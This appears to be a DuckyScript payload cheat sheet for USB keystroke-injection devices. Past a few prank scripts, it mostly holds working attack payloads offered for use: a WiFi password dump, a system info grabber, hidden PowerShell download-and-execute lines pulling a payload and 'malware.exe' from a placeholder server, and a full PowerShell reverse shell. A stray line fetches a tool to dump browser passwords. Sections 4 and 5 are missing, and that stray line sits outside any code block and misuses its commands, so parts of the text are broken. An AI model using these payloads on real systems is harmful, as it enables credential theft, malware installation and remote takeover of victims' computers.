### 1. Basic Prank Payloads

**Rickroll**
```duckyscript
DELAY 1000
GUI r
DELAY 400
STRING https://www.youtube.com/watch?v=dQw4w9wgxcq
ENTER
```

**Infinite Notepad**
```duckyscript
GUI r
DELAY 300
STRING notepad
ENTER
DELAY 500
REPEAT 30
STRING This is a prank by Duckyscript!
ENTER
```

---

### 2. Information Gathering Payloads

**Dump WiFi Passwords (Windows)**
```duckyscript
GUI r
DELAY 400
STRING cmd
ENTER
DELAY 600
STRING for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles') do @echo %a >> C:\temp\wifi.txt && netsh wlan show profile name="%a" key=clear >> C:\temp\wifi.txt
ENTER
DELAY 800
STRING notepad C:\temp\wifi.txt
ENTER
```

**System Info Grabber**
```duckyscript
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 700
STRING $computer = Get-WmiObject -Class Win32_ComputerSystem; $user = $env:USERNAME; $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress; echo "User: $user | PC: $($computer.Name) | IP: $ip" > C:\temp\info.txt
ENTER
```

---

### 3. Download & Execute Payloads

**Download and Run (PowerShell)**
```duckyscript
GUI r
DELAY 400
STRING powershell
ENTER
DELAY 600
STRING IEX (New-Object Net.WebClient).DownloadString('http://yourserver.com/payload.ps1')
ENTER
```

**Silent Download + Execute**
```duckyscript
GUI r
DELAY 300
STRING powershell -w hidden -c "Invoke-WebRequest -Uri 'http://yourserver.com/malware.exe' -OutFile '$env:TEMP\update.exe'; Start-Process '$env:TEMP\update.exe'"
ENTER
```

**PowerShell Reverse Shell (One-liner)**
```duckyscript
GUI r
DELAY 400
STRING powershell
ENTER
DELAY 700
STRING $client = New-Object System.Net.Sockets.TCPClient('your.ip.here',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
ENTER
```

STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Flangvik/SharpCollection/master/CompiledBinaries/SharpChrome.exe'); SharpChrome.exe passwords --unhide

### 6. DuckyScript 3.0 Example (with Functions)

```duckyscript
DELAY 1500

FUNCTION openNotepad()
    GUI r
    DELAY 300
    STRING notepad
    ENTER
    DELAY 800
END_FUNCTION

FUNCTION typeMessage($msg)
    STRINGLN $msg
END_FUNCTION

openNotepad()
typeMessage("Hello from DuckyScript 3.0!")
typeMessage("This is much cleaner!")
```
